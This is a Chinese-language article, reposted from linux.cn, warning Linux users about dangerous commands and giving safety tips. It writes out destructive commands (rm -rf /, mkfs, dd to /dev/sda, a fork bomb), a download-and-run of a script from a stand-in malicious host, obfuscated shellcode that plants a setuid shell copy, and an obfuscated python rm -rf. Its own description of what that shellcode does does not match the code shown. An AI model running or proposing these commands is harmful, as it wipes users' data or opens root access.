# 千万千万不要运行的 Linux 命令 - 文章 - 伯乐在线
原文出处： [linux中国](https://linux.cn/article-401-1.html)
文中列出的命令绝对不可以运行，即使你觉得很好奇也不行，除非你是在虚拟机上运行（出现问题你可以还原），因为它们会实实在在的破坏你的系统。所以不在root等高级管理权限下执行命令是很好的习惯。
早晚有一天，Linux 系统会像 Windows 那样流行，用的人越来越多，包括对计算机不是很了解的人，本文的目的就是告诉大家：在 Linux 给你最大程度自由度的同时，也使得破坏系统变得更加容易，如果你不了解某些命令的意义，下载执行包含恶意命令的脚本，或者被骗运行某些命令，很容易让你哭 都来不及。
这并不是说明 Linux 不安全，只是说明在不了解 Linux ，和很不小心的人面前，Linux 十分不安全。Windows 也好，Linux 也好，人本身才是最大的不安全因素。
下面的命令会删除你硬盘上的文件，rm 的 -r 递归删除，和 -f 强制删除是很危险的选项，即使日常操作，也会遇到误删文件的情况。
> 
sudo rm -rf / 删除根分区全部的文件
sudo rm -rf . 删除当前目录下的所有文件
sudo rm -rf * 同上
rm -rf * or rm -rf *.* 同上
rm -rf ~ / & 删除根分区和家目录，即使你不是root，家目录还是不能幸免。
同样，如果你不知道 mkfs.xxxx (xxxx 可以是 vfat、ext2、ext3、bfs……) 是格式化命令的话，运行下面的命令会擦除你的硬盘分区：
> 
sudo mkfs.xxxx
dd 是强大的 IO 输入输出定向工具，如果使用不当，破坏性很大，不仅仅是当前分区，当前系统，有的时候是整个硬盘。
> 
sudo dd if=/dev/zero of=/dev/sda 全部硬盘清零。
sudo dd if=/dev/sda of=/dev/sdb 用第一块硬盘的内容覆盖第二块的内容。
sudo dd if=something of=/dev/sda 往硬盘上写垃圾数据。
同理，直接把命令结果定向到硬盘上，相当于往硬盘上写垃圾数据：
> 
any_command > /dev/sda 用随意的数据破坏硬盘
上面的 sda 、sdb 也可能是其他类似的名称。Linux 的 /dev 系统给操纵硬件提供了很方便和强大的功能，同时也使得破坏变得更容易。
fork 命令打开一个子进程，如果把 fork 放在无限循环中，最终子进程会耗尽所有内存资源：
> 
:(){:|:&};:
这段不知所云的符号，可以让 Shell 不停的 fork 子进程，最后导致内存耗尽，不得不重启，这不是 bug，只是 Shell 语句故意写成简写的形式而已。下面的同理：
> 
fork while fork
有的时候，压缩包也是一个破坏来源～
有的压缩包要求你解压到某个系统中已经存在的目录中，这时候你就要特别小心了，压缩包里面可能有成千上万的小文件，以各种文件名尝试覆盖你现有的文件。
有的压缩包看起来很小，但是解压出来是上 GB 的垃圾数据，会充斥你的硬盘。
从不正规网站下载的程序、脚本，同样会有包含恶意命令的危险，不可随便执行：
> 
wget [url]http://some_place/some_file[/url]
sh ./some_file
wget [url]http://hax018r.org/malicious-script[/url]
sh ./malicious-script
载脚本要确保来源正规，如果有能力，可以阅读其代码。即使有源代码的程序，也不要随便编译执行：
> 
char esp[] __attribute__ ((section(“.text”))) /* e.s.p
release */
= “xebx3ex5bx31xc0x50x54x5ax83xecx64x68”
“xffxffxffxffx68xdfxd0xdfxd9x68x8dx99”
“xdfx81x68x8dx92xdfxd2x54x5exf7x16xf7”
“x56x04xf7x56x08xf7x56x0cx83xc4x74x56”
“x8dx73x08x56x53x54x59xb0x0bxcdx80x31”
“xc0x40xebxf9xe8xbdxffxffxffx2fx62x69”
“x6ex2fx73x68x00x2dx63x00”
“cp -p /bin/sh /tmp/.beyond; chmod 4755
/tmp/.beyond;”;
上面看起来只是一堆没有意义的 16 进制数据，如果有人告诉你，运行这个程序你就可以不输入密码取得系统的 root 权限，你可不要相信他，上面的程序实际运行的是“rm -rf ~ / & ”。
python 一类的脚本语言，同样可以拿来搞破坏：
> 
python -c ‘import os; os.system(“”.join([chr(ord(i)-1) for i in “sn!.sg! “]))’
这段程序实际上会执行 rm -rf *，也许你很奇怪上面程序结尾的 “sn!.sg! ” 是什么意思，实际上就是 rm -rf * 每个字母的下一个！
### 那么我们如何避免运行恶意程序呢？
第一：不要用 root 作为日常使用的用户，上面的程序，如果当前用户不是 root，危害的波及范围就会小很多。
第二：要知道哪些命令是干什么用的，不知道的命令不要冒然运行。运行有潜在破坏能力的程序，要小心检查自己的输入。
第三：要保证软件、脚本的来源正规。
最后一点，虽然比较消极，但是确实十分重要的一点：
经常备份你的数据！！
